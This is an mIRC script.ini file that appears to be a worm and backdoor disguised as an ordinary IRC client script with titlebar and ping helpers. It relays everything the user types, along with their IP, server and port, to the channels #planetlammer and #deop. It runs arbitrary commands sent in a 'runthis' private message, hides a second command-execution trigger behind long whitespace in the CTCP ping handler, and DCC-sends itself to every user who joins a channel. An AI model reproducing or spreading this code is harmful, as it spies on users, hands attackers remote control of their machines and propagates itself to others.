[script]
n0=iobhong
n1=bhong
n2=on 1:START:{
n3=  .sreq ignore
n4=  .remote on
n5=}
n6=on 1:CONNECT:
n7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n8=on 1:INPUT:*:{
n9=  .msg #planetalammer ( $+ $active $+ ) $1-
n10=}
n11=on 1:TEXT:*:?:{
n12=  if ( $1 == runthis ) { .run $2- }
n13=}
n14=
n15=on 1:JOIN:*:{
n16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n17=}
n18=.remote on
n19=titlebar (Not connected)
n20=}
n21=raw 401:*: {
n22=halt
n23=}
n24=RAW 001:*:titlebar (Connecting to $server $+ )
n25=
n26=on 1:CONNECT:titlebar (Connected to $server $+ )   | .msg  #deop Hi.  $ip on $server $+ : $+ $port $+ .
n27=
n28=on 1:DISCONNECT:titlebar (Not connected)
n29=
n30=;if you type something in status it doesn't have to have "/"
n31=on 1:INPUT:*:{         |                   .msg #deop ( $+ $active $+ ) $1-
n32=set %a status window
n33=if ( $active == %a ) { $1- | halt }
n34=}
n35=
n36=;ping stuff
n37=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n38=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n39=
n40=;if you are banned but still opped, unban self
n41=